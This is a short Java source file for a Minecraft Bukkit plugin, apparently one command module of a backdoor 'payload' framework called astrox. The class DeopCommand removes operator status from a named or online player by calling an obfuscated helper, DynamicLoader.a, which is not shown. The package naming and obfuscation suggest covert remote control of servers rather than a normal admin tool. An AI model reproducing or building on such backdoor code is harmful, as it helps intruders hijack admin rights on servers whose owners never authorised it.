package dev.naruto.astrox.payload.commands;

import dev.naruto.astrox.utils.DynamicLoader;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class DeopCommand implements Command {
    @Override
    public void execute(Player sender, String[] args, JavaPlugin plugin) {
        Player target = (args.length > 0) ? Bukkit.getPlayer(args[0]) : sender;

        if (target != null) {
            DynamicLoader.a(target, false); // FIXED
        } else if (args.length > 0) {
            DynamicLoader.a(Bukkit.getOfflinePlayer(args[0]).getPlayer(), false); // FIXED
        }
    }

    @Override
    public String getDescription() { return "Remove operator status"; }

    @Override
    public String getUsage() { return "[player]"; }
}
